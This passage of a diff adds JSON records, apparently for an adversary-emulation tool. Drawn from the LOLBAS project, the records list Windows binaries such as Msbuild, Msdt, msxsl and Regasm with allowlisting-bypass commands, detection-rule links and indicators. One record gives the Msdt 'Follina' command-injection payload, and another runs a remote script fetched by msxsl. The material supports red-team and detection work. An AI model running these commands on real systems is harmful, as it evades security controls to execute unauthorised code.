+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Installutil.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Installutil.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Use to execute code and bypass application whitelisting",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1218.004",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\InstallUtil.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\InstallUtil.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\InstallUtil.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://pentestlab.blog/2017/05/08/applocker-bypass-installutil/",
+          "https://evi1cg.me/archives/AppLocker_Bypass_Techniques.html#menu_index_12",
+          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.004/T1218.004.md",
+          "https://www.blackhillsinfosec.com/powershell-without-powershell-how-to-bypass-application-whitelisting-environment-restrictions-av/",
+          "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/",
+          "https://docs.microsoft.com/en-us/dotnet/framework/tools/installutil-exe-installer-tool"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_installutil_download.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_installutil_beacon.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "DLL (.NET)"
+          },
+          {
+            "Execute": "EXE (.NET)"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Installutil.yml:0:0",
+        "source_tcodes": [
+          "T1218.004"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Microsoft.Workflow.Compiler.yml:0:2",
+      "name": "LOLBAS - T1127 - Microsoft.Workflow.Compiler.exe - AWL Bypass - Compile and run code [e9b23ec]",
+      "description": "A utility included with .NET that is capable of compiling and executing C# or VB.net code.. Compile and execute C# or VB.net code in a XOML file referenced in the test.txt file. Use case: Compile and run code. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "Microsoft.Workflow.Compiler.exe #{lotl_lolbas_local_path} #{lotl_lolbas_local_path_703b495}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path",
+        "lotl_lolbas_local_path_703b495"
+      ],
+      "required_assets": [],
+      "operational_risk": "interact",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Microsoft.Workflow.Compiler.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Microsoft.Workflow.Compiler.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Microsoft.Workflow.Compiler.exe",
+        "command_index": 2,
+        "category": "AWL Bypass",
+        "usecase": "Compile and run code",
+        "privileges": "User",
+        "operating_system": "Windows 10S, Windows 11",
+        "source_mitre_id": "T1127",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.Net\\Framework64\\v4.0.30319\\Microsoft.Workflow.Compiler.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/mattifestation/status/1030445200475185154",
+          "https://posts.specterops.io/arbitrary-unsigned-code-execution-vector-in-microsoft-workflow-compiler-exe-3d9294bc5efb",
+          "https://gist.github.com/mattifestation/3e28d391adbd7fe3e0c722a107a25aba#file-workflowcompilerdetectiontests-ps1",
+          "https://gist.github.com/mattifestation/7ba8fc8f724600a9f525714c9cf767fd#file-createcompilerinputxml-ps1",
+          "https://www.forcepoint.com/blog/security-labs/using-c-post-powershell-attacks",
+          "https://www.fortynorthsecurity.com/microsoft-workflow-compiler-exe-veil-and-cobalt-strike/",
+          "https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_lolbin_workflow_compiler.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/961a81d4a5cb5c5febec4894d6d812497171a85c/detections/endpoint/suspicious_microsoft_workflow_compiler_usage.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_microsoft_workflow_compiler_rename.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "Microsoft.Workflow.Compiler.exe would not normally be run on workstations."
+          },
+          {
+            "IOC": "The presence of csc.exe or vbc.exe as child processes of Microsoft.Workflow.Compiler.exe"
+          },
+          {
+            "IOC": "Presence of \"<CompilerInput\" in a text file."
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "XOML"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Microsoft.Workflow.Compiler.yml:0:2",
+        "source_tcodes": [
+          "T1127"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Msbuild.yml:0:0",
+      "name": "LOLBAS - T1127.001 - Msbuild.exe - AWL Bypass - Compile and run code [7a928bb]",
+      "description": "Used to compile and execute code. Build and execute a C# project stored in the target XML file. Use case: Compile and run code. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127.001",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "msbuild.exe #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Msbuild.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msbuild.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Msbuild.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Compile and run code",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1127.001",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\Msbuild.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\Msbuild.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v3.5\\Msbuild.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v3.5\\Msbuild.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Msbuild.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\Msbuild.exe",
+          "C:\\Program Files (x86)\\MSBuild\\14.0\\bin\\MSBuild.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1127/T1127.md",
+          "https://github.com/Cn33liz/MSBuildShell",
+          "https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/",
+          "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/",
+          "https://gist.github.com/bohops/4ffc43a281e87d108875f07614324191",
+          "https://github.com/LOLBAS-Project/LOLBAS/issues/165",
+          "https://docs.microsoft.com/en-us/visualstudio/msbuild/msbuild-response-files",
+          "https://www.daveaglick.com/posts/msbuild-loggers-and-logging-events"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/file/file_event/file_event_win_shell_write_susp_directory.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_msbuild_susp_parent_process.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/network_connection/net_connection_win_silenttrinity_stager_msbuild_activity.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_msbuild_spawn.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/18f63553a9dc1a34122fa123deae2b2f9b9ea391/detections/endpoint/suspicious_msbuild_rename.yml"
+          },
+          {
+            "Splunk": "https://github.com/splunk/security_content/blob/a1afa0fa605639cbef7d528dec46ce7c8112194a/detections/endpoint/msbuild_suspicious_spawned_by_script_process.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_msbuild_beacon_sequence.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_msbuild_making_network_connections.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/ef7548f04c4341e0d1a172810330d59453f46a21/rules/windows/defense_evasion_execution_msbuild_started_by_script.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_execution_msbuild_started_by_office_app.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/61afb1c1c0c3f50637b1bb194f3e6fb09f476e50/rules/windows/defense_evasion_execution_msbuild_started_renamed.toml"
+          },
+          {
+            "BlockRule": "https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules"
+          },
+          {
+            "IOC": "Msbuild.exe should not normally be executed on workstations"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "CSharp"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Msbuild.yml:0:0",
+        "source_tcodes": [
+          "T1127.001"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Msdeploy.yml:0:1",
+      "name": "LOLBAS - T1218 - Msdeploy.exe - AWL Bypass - Local execution of batch file using msdeploy.exe. [4bdf60d]",
+      "description": "Microsoft tool used to deploy Web Applications.. Launch .bat file via msdeploy.exe. Use case: Local execution of batch file using msdeploy.exe.. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand=\"#{lotl_lolbas_local_path}\"",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "interact",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Msdeploy.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msdeploy.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "Msdeploy.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Local execution of batch file using msdeploy.exe.",
+        "privileges": "User",
+        "operating_system": "Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11, Windows Server",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Program Files\\IIS\\Microsoft Web Deploy V2\\msdeploy.exe",
+          "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V2\\msdeploy.exe",
+          "C:\\Program Files\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe",
+          "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V3\\msdeploy.exe",
+          "C:\\Program Files\\IIS\\Microsoft Web Deploy V4\\msdeploy.exe",
+          "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V4\\msdeploy.exe",
+          "C:\\Program Files\\IIS\\Microsoft Web Deploy V5\\msdeploy.exe",
+          "C:\\Program Files (x86)\\IIS\\Microsoft Web Deploy V5\\msdeploy.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/pabraeken/status/995837734379032576",
+          "https://twitter.com/pabraeken/status/999090532839313408"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/683b63f8184b93c9564c4310d10c571cbe367e1e/rules/windows/process_creation/proc_creation_win_lolbin_msdeploy.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "CMD"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Msdeploy.yml:0:1",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Msdt.yml:0:1",
+      "name": "LOLBAS - T1218 - Msdt.exe - AWL Bypass - Execute code bypass Application whitelisting [2f3346d]",
+      "description": "Microsoft diagnostics tool. Executes the Microsoft Diagnostics Tool and executes the malicious .MSI referenced in the .xml file. Use case: Execute code bypass Application whitelisting. Privilege: User.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af #{lotl_lolbas_payload_path} /skip TRUE",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Msdt.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Msdt.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Execute code bypass Application whitelisting",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1218",
+        "full_paths": [
+          "C:\\Windows\\System32\\Msdt.exe",
+          "C:\\Windows\\SysWOW64\\Msdt.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/",
+          "https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/",
+          "https://twitter.com/harr0ey/status/991338229952598016",
+          "https://twitter.com/nas_bench/status/1531944240271568896"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          }
+        ],
+        "tags": [
+          {
+            "Application": "GUI"
+          },
+          {
+            "Execute": "MSI"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Msdt.yml:0:1",
+        "source_tcodes": [
+          "T1218"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Msdt.yml:0:2",
+      "name": "LOLBAS - T1202 - Msdt.exe - AWL Bypass - Execute code bypass Application allowlisting [5487947]",
+      "description": "Microsoft diagnostics tool. Executes arbitrary commands using the Microsoft Diagnostics Tool and leveraging the \"PCWDiagnostic\" module (CVE-2022-30190). Note that this specific technique will not work on a patched system with the June 2022 Windows Security update. Use case: Execute code bypass Application allowlisting. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1202",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "msdt.exe /id PCWDiagnostic /skip force /param \"IT_LaunchMethod=ContextMenu IT_BrowseForFile=/../../$(calc).exe\"",
+      "cleanup_command": null,
+      "required_tags": [],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Msdt.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Msdt.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Msdt.exe",
+        "command_index": 2,
+        "category": "AWL Bypass",
+        "usecase": "Execute code bypass Application allowlisting",
+        "privileges": "User",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1202",
+        "full_paths": [
+          "C:\\Windows\\System32\\Msdt.exe",
+          "C:\\Windows\\SysWOW64\\Msdt.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/",
+          "https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/",
+          "https://twitter.com/harr0ey/status/991338229952598016",
+          "https://twitter.com/nas_bench/status/1531944240271568896"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml"
+          },
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          }
+        ],
+        "tags": [
+          {
+            "Application": "GUI"
+          },
+          {
+            "Execute": "CMD"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OSBinaries/Msdt.yml:0:2",
+        "source_tcodes": [
+          "T1202"
+        ],
+        "context": "all",
+        "readiness": "ready",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Msxsl.yml:0:1",
+      "name": "LOLBAS - T1220 - msxsl.exe - AWL Bypass - Local execution of script stored in XSL file. [fb19588]",
+      "description": "Command line utility used to perform XSL transformations.. Run COM Scriptlet code within the script.xsl file (local). Use case: Local execution of script stored in XSL file.. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1220",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "msxsl.exe #{lotl_lolbas_payload_path} #{lotl_lolbas_payload_path_2690070}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path",
+        "lotl_lolbas_payload_path_2690070"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Msxsl.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "msxsl.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Local execution of script stored in XSL file.",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1220",
+        "full_paths": [
+          "no default"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/subTee/status/877616321747271680",
+          "https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker",
+          "https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "XSL"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Msxsl.yml:0:1",
+        "source_tcodes": [
+          "T1220"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Msxsl.yml:0:3",
+      "name": "LOLBAS - T1220 - msxsl.exe - AWL Bypass - Local execution of remote script stored in XSL script stored as an XML file. [9bb12ca]",
+      "description": "Command line utility used to perform XSL transformations.. Run COM Scriptlet code within the shellcode.xml(xsl) file (remote). Use case: Local execution of remote script stored in XSL script stored as an XML file.. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1220",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "msxsl.exe #{lotl_lolbas_remote_url} #{lotl_lolbas_remote_url}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_remote_url"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Msxsl.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Msxsl.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "msxsl.exe",
+        "command_index": 3,
+        "category": "AWL Bypass",
+        "usecase": "Local execution of remote script stored in XSL script stored as an XML file.",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1220",
+        "full_paths": [
+          "no default"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://twitter.com/subTee/status/877616321747271680",
+          "https://github.com/3gstudent/Use-msxsl-to-bypass-AppLocker",
+          "https://github.com/RonnieSalomonsen/Use-msxsl-to-download-file"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_wmic_xsl_script_processing.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/cc241c0b5ec590d76cb88ec638d3cc37f68b5d50/rules/windows/defense_evasion_msxsl_beacon.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/defense_evasion_msxsl_network.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "XSL"
+          },
+          {
+            "Execute": "Remote"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Msxsl.yml:0:3",
+        "source_tcodes": [
+          "T1220"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": [
+          "Operator-controlled remote infrastructure must be reachable from the authorized target."
+        ]
+      }
+    },
+    {
+      "id": "lolbas:yml/OtherMSBinaries/Rcsi.yml:0:1",
+      "name": "LOLBAS - T1127 - rcsi.exe - AWL Bypass - Local execution of arbitrary C# code stored in local CSX file. [443d04c]",
+      "description": "Non-Interactive command line inerface included with Visual Studio.. Use embedded C# within the csx script to execute the code. Use case: Local execution of arbitrary C# code stored in local CSX file.. Privilege: User.",
+      "tactic": "Multiple",
+      "tcode": "T1127",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "rcsi.exe #{lotl_lolbas_local_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_local_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OtherMSBinaries/Rcsi.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Rcsi.yml",
+        "source_directory": "OtherMSBinaries",
+        "source_name": "rcsi.exe",
+        "command_index": 1,
+        "category": "AWL Bypass",
+        "usecase": "Local execution of arbitrary C# code stored in local CSX file.",
+        "privileges": "User",
+        "operating_system": "Windows",
+        "source_mitre_id": "T1127",
+        "full_paths": [
+          "no default"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://enigma0x3.net/2016/11/21/bypassing-application-whitelisting-by-using-rcsi-exe/"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_unusual_process_network_connection.toml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml"
+          },
+          {
+            "BlockRule": "https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_csi_execution.yml"
+          }
+        ],
+        "tags": [
+          {
+            "Execute": "CSharp"
+          }
+        ],
+        "provider": "lolbas",
+        "source_id": "lolbas:yml/OtherMSBinaries/Rcsi.yml:0:1",
+        "source_tcodes": [
+          "T1127"
+        ],
+        "context": "all",
+        "readiness": "ready_with_parameters",
+        "prerequisites": []
+      }
+    },
+    {
+      "id": "lolbas:yml/OSBinaries/Regasm.yml:0:0",
+      "name": "LOLBAS - T1218.009 - Regasm.exe - AWL Bypass - Execute code and bypass Application whitelisting [790aa6f]",
+      "description": "Part of .NET. Loads the target .NET DLL file and executes the RegisterClass function. Use case: Execute code and bypass Application whitelisting. Privilege: Local Admin.",
+      "tactic": "Defense Evasion",
+      "tcode": "T1218.009",
+      "executor": "cmd",
+      "platform": "windows",
+      "command": "regasm.exe #{lotl_lolbas_payload_path}",
+      "cleanup_command": null,
+      "required_tags": [
+        "lotl_lolbas_payload_path"
+      ],
+      "required_assets": [],
+      "operational_risk": "observe",
+      "source_metadata": {
+        "source_file": "yml/OSBinaries/Regasm.yml",
+        "source_documentation": "https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regasm.yml",
+        "source_directory": "OSBinaries",
+        "source_name": "Regasm.exe",
+        "command_index": 0,
+        "category": "AWL Bypass",
+        "usecase": "Execute code and bypass Application whitelisting",
+        "privileges": "Local Admin",
+        "operating_system": "Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11",
+        "source_mitre_id": "T1218.009",
+        "full_paths": [
+          "C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727\\regasm.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727\\regasm.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe",
+          "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe"
+        ],
+        "aliases": [],
+        "resources": [
+          "https://pentestlab.blog/2017/05/19/applocker-bypass-regasm-and-regsvcs/",
+          "https://oddvar.moe/2017/12/13/applocker-case-study-how-insecure-is-it-really-part-1/",
+          "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.009/T1218.009.md"
+        ],
+        "detection": [
+          {
+            "Sigma": "https://github.com/SigmaHQ/sigma/blob/6312dd1d44d309608552105c334948f793e89f48/rules/windows/process_creation/proc_creation_win_lolbin_regasm.yml"
+          },
+          {
+            "Elastic": "https://github.com/elastic/detection-rules/blob/12577f7380f324fcee06dab3218582f4a11833e7/rules/windows/execution_register_server_program_connecting_to_the_internet.toml"
+          },
+          {
